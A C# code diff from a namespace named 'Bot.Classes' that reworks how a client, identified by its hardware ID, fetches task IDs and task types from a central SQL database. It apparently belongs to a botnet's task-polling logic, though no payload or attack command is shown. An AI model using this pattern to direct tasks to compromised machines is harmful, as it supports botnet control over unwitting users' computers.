@@ -103,30 +103,26 @@ namespace Bot.Classes
                     break;
             }
         }
-
-        public static string getCtaskString()
+        
+        public static int[] getTaskID()
         {
             using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
             {
                 conn.Open();
-                string CTaskString = "";
-                using (SqlCommand cmd = new SqlCommand("SELECT CTask FROM bots WHERE HWID = @HWID", conn))
+                int[] TaskID = new int[getTaskAmount() + 2];
+                for (int i = 1; i <= getTaskAmount(); i++)
                 {
-                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
-                    CTaskString = (string)cmd.ExecuteScalar();
-                }
-                return CTaskString;
-            }
-        }
+                    using (SqlCommand cmd = new SqlCommand("SELECT DISTINCT TaskID FROM (SELECT TaskID, DENSE_RANK() OVER (order by TaskID) AS rownum FROM Tasks WHERE HWID = @HWID GROUP BY TaskID ) AS tbl WHERE tbl.rownum = @i;", conn))
+                    {
+                        cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
+                        cmd.Parameters.AddWithValue("i", i);
 
-        public static string[] getCTasks()
-        {
-            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
-            {
-                conn.Open();
-                string[] CTask = getCtaskString().Split(';');
-                return CTask;
-            }   
+                        TaskID[i] = (int)cmd.ExecuteScalar();
+                        cmd.Parameters.Clear();
+                    }
+                }
+                return TaskID;
+            }
         }
 
         public static int getTaskAmount()
@@ -144,35 +140,20 @@ namespace Bot.Classes
             }
         }
 
-        public static int[] getTaskID()
-        {
-            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
-            {
-                conn.Open();
-                int[] TaskID = new int[getTaskAmount() + 1];
-                for(int i = 1;i <= getTaskAmount();i++)
-                {
-                    using (SqlCommand cmd = new SqlCommand("SELECT TaskID from Tasks where HWID = @HWID;", conn))
-                    {
-                        cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
-                        TaskID[i] = Convert.ToInt32(cmd.ExecuteScalar());
-                    }
-                }
-                return TaskID;
-            }
-        }
-
         public static string getTask(int i)
         {
             using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
             {
                 conn.Open();
                 string Type = "";
-                using (SqlCommand cmd = new SqlCommand("SELECT Type from Tasks where HWID = @HWID;", conn))
+                using (SqlCommand cmd = new SqlCommand("SELECT Type from Tasks where HWID = @HWID AND TaskID = @TaskID;", conn))
                 {
                     cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                     cmd.Parameters.AddWithValue("TaskID", getTaskID()[i]);
-                    Type = cmd.ExecuteScalar().ToString();
+                    if(cmd.ExecuteScalar().ToString() != null)
+                    {
+                        Type = cmd.ExecuteScalar().ToString();
+                    }
                 }
                 return Type;
             }
